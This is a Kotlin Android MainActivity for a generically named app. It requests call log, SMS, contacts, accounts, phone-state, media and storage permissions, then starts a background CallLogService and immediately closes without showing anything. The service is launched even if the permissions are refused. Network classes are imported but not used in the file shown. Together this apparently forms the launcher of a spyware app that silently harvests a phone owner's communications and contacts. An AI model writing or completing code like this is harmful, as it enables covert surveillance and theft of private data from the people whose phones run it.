package com.example.myapplication

import android.content.Intent
import android.content.pm.PackageManager
import android.os.Bundle
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.example.myapplication.calllogservice.CallLogService
import android.Manifest
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {
    // Регистрируем ActivityResultLauncher для запроса нескольких разрешений
    private val requestPermissionsLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { permissions ->
        // Проверяем, все ли разрешения предоставлены
        if (permissions.all { it.value }) {
            startCallLogService()
        } else {

            finish()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Список необходимых разрешений
        val requiredPermissions = arrayOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.GET_ACCOUNTS,
            Manifest.permission.READ_PHONE_STATE,
        )

        // Проверяем, есть ли уже все разрешения
        if (!requiredPermissions.all {
                ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
            }) {
            requestPermissionsLauncher.launch(requiredPermissions)
        }
        startCallLogService()
        // Закрываем активность после запуска сервиса
        finish()
    }

    private fun startCallLogService() {
        val intent = Intent(this, CallLogService::class.java)
        startService(intent)
    }
}